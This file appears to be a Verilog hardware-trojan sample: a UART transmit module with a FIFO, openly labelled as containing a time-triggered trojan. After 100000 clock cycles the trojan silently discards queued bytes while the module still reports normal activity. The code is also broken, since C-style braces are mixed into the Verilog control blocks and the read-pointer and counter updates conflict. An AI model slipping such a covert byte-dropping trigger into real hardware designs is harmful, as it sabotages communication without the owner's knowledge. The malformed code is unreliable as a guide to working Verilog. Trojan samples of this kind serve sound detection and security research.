 // UART TX Module with FIFO and Byte-Dropping Trojan
//
// This module wraps the uart_tx module, adding a FIFO to buffer outgoing data.
// Includes a Hardware Trojan that starts dropping bytes after a specific time delay.
//
module uart_tx_fifo_byte_dropping_trojan (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    // FIFO Memory and counters
    reg [7:0] mem [0:31];
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0;
    reg [4:0] cnt = 5'd0;
    reg we = 1'b0;
    reg [7:0] data = 8'd0;

    // Trojan trigger and effect
    integer cycle_counter = 0; // Counts the number of cycles since module activation
    reg trojan_triggered = 1'b0; // Indicates whether the trojan has been triggered

    // UART Interface
    wire uart_busy;
    uart_tx uart (
        .clk(clk),
        .rx_we(we),
        .rx_data(data), // Transmit data
        .tx_busy(uart_busy),
        .tx_serial(tx_serial)
    );

    // Control Logic for FIFO and Trojan triggering
    wire read = ~uart_busy & (cnt > 5'd0) & ~we;
    wire write = rx_we & (cnt < 5'd31);

    always @ (posedge clk) begin
        // Manage FIFO operations
        if (write & ~read) begin
            cnt <= cnt + 5'd1;
        } else if (read & ~write) begin
            cnt <= cnt - 5'd1;
        }

        if (read && !trojan_triggered) begin
            r_addr <= r_addr + 5'd1;
            data <= mem[r_addr]; // Send out data from FIFO
            we <= 1'b1;
        } else {
            we <= 1'b0;
        }

        if (write) begin
            w_addr <= w_addr + 5'd1;
            mem[w_addr] <= rx_data; // Store incoming data to FIFO
        end

        // Update cycle counter and check if trojan should be triggered
        cycle_counter <= cycle_counter + 1;
        if (cycle_counter >= 100000) begin // Arbitrary delay for trojan activation
            trojan_triggered <= 1'b1;
        end

        // If trojan is triggered and read is attempted, advance read pointer without transmitting
        if (trojan_triggered && read) begin
            r_addr <= r_addr + 5'd1;
        end
    end

    always @ (*) begin
        tx_busy = (cnt != 0) || uart_busy; // Reflect UART activity and FIFO status
    end

endmodule
